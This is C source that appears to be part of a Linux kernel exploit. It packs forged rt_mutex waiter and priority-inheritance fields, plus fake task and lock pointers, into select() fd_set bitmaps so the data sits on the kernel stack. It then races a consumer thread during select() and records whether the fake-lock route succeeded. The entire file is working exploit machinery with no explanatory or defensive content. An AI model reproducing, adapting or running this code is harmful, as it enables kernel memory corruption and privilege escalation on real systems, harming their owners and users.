#include "common.h"
#include <time.h>
static double fops_elapsed_ms(struct timespec *ref) {
  struct timespec now;
  clock_gettime(CLOCK_MONOTONIC, &now);
  return (now.tv_sec - ref->tv_sec) * 1000.0 + (now.tv_nsec - ref->tv_nsec) / 1e6;
}
extern int pselect_custom_write;

int route_last_step;
int route_last_errno;

static int route_delay_usec(int attempt) {
  (void)attempt;
  /* Let select() establish its stack frame before the PI walk. */
  return PSELECT_ENTER_DELAY_USEC;
}

void fdset_put_word(fd_set *set, int word, uint64_t value) {
  unsigned long *bits = (unsigned long *)set;
  bits[word] = (unsigned long)value;
}

uint64_t fdset_get_word(const fd_set *set, int word) {
  const unsigned long *bits = (const unsigned long *)set;
  return bits[word];
}

static int pselect_words_per_set(void) {
  int bits_per_word = (int)(8 * sizeof(unsigned long));
  return (PSELECT_ROUTE_NFDS + bits_per_word - 1) / bits_per_word;
}

static int pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1:
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2:
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}

static int pselect_waiter_shift(void) {
  return active_offsets ? active_offsets->pselect_waiter_shift
                        : PSELECT_WAITER_WORD_SHIFT;
}

static void pselect_put_waiter_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int waiter_word, uint64_t value, const char *name) {
  int global_word = pselect_waiter_shift() + waiter_word;
  int placed = pselect_put_global_word(
      in, out, ex, words_per_set, global_word, value);
  if (!placed) {
    pr_warning("pselect cannot place %s waiter_word=%d global_word=%d "
               "words_per_set=%d nfds=%d\n",
               name, waiter_word, global_word, words_per_set,
               PSELECT_ROUTE_NFDS);
  }
}

void open_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd) {
  (void)write_fd;

  int high_read = fcntl(read_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
  if (high_read < 0) {
    pr_warning("pselect F_DUPFD read errno=%d\n", errno);
    return;
  }
  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(high_read, fd);
    }
  }
  close(high_read);
  dup2(read_fd, PSELECT_ROUTE_NFDS - 1);
  FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
}

void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  int words_per_set = pselect_words_per_set();
  struct pselect_waiter_word {
    int word;
    uint64_t value;
    const char *name;
  } words[] = {
    {2, 0, "tree_pc"},
    {3, 0, "tree_right"},
    {4, 0, "tree_left"},
    {5, 1, "tree_prio"},
    {6, 0, "tree_deadline"},
    {7, 0, "pi_parent"},
    {8, 0, "pi_right"},
    {9, 0, "pi_left"},
    {10, 1, "pi_prio"},
    {11, 0, "pi_deadline"},
    {12, fake_task, "task"},
    {13, fake_lock, "lock"},
    {14, 3, "wake_state"},
  };
  for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
    struct pselect_waiter_word *w = &words[i];
    pselect_put_waiter_word(
        in, out, ex, words_per_set, w->word, w->value, w->name);
  }
}

void do_pselect_fake_lock_route(void) {
  if (!page_base || !fake_lock || !fake_fops) {
    route_last_step = 30;
    route_last_errno = 0;
    pr_error("pselect route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
             page_base, fake_lock, fake_fops);
    return;
  }

  struct timespec route_t0;
  clock_gettime(CLOCK_MONOTONIC, &route_t0);
  int calls = 0;
  int success = 0;
  int pipefd[2];
  SYSCHK(pipe(pipefd));
  int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
  if (block_fd < 0) {
    pr_warning("pselect timerfd_create failed errno=%d; using pipe read end\n",
               errno);
    block_fd = pipefd[0];
  }
  int high_read = fcntl(block_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 16);
  if (high_read < 0) {
    route_last_step = 31;
    route_last_errno = errno;
    pr_error("pselect F_DUPFD read errno=%d\n", errno);
    if (block_fd != pipefd[0]) {
      close(block_fd);
    }
    close(pipefd[0]);
    close(pipefd[1]);
    return;
  }

  fd_set in;
  fd_set out;
  fd_set ex;
  prepare_pselect_fdsets(&in, &out, &ex);
  pr_info("pselect route setup shift=%d page=%016zx "
          "fake_lock=%016zx fake_w0=%016zx fake_task=%016zx "
          "in0=%016llx in3=%016llx out0=%016llx ex0=%016llx "
          "ex1=%016llx ex2=%016llx ex3=%016llx\n",
          pselect_waiter_shift(),
          page_base, fake_lock, fake_w0, fake_task,
          (unsigned long long)fdset_get_word(&in, 0),
          (unsigned long long)fdset_get_word(&in, 3),
          (unsigned long long)fdset_get_word(&out, 0),
          (unsigned long long)fdset_get_word(&ex, 0),
          (unsigned long long)fdset_get_word(&ex, 1),
          (unsigned long long)fdset_get_word(&ex, 2),
          (unsigned long long)fdset_get_word(&ex, 3));
  open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);

  atomic_store(&consumer_calls, 0);
  atomic_store(&consumer_success, 0);
  atomic_store(&punch_consume_stop, 0);
  int delay_usec = route_delay_usec(1);
  atomic_store(&main_route_delay_usec, delay_usec);
  atomic_store(&punch_consume_go, 1);

  struct timeval timeout = {
    .tv_sec = PSELECT_TIMEOUT_SEC,
#ifdef PSELECT_TIMEOUT_USEC
    .tv_usec = PSELECT_TIMEOUT_USEC,
#else
    .tv_usec = 0,
#endif
  };

  pr_info("pselect pre-select +%.0fms\n", fops_elapsed_ms(&route_t0));
  errno = 0;
  int ret = select(PSELECT_ROUTE_NFDS, &in, &out, &ex, &timeout);
  int saved_errno = errno;
  pr_info("pselect post-select +%.0fms ret=%d\n", fops_elapsed_ms(&route_t0), ret);
  atomic_store(&punch_consume_go, 0);

  calls = atomic_load(&consumer_calls);
  success = atomic_load(&consumer_success);
  pr_info("pselect returned ret=%d errno=%d calls=%d success=%d delay=%d\n",
          ret, saved_errno, calls, success, delay_usec);

  if (calls > 0 && success > 0) {
    route_last_step = 0;
    route_last_errno = 0;
  } else {
    route_last_step = 33;
    route_last_errno = saved_errno;
  }

  close(high_read);
  if (block_fd != pipefd[0]) {
    close(block_fd);
  }
  close(pipefd[0]);
  close(pipefd[1]);

  pr_info("pselect route done calls=%d success=%d step=%d errno=%d\n",
          calls, success, route_last_step, route_last_errno);
}

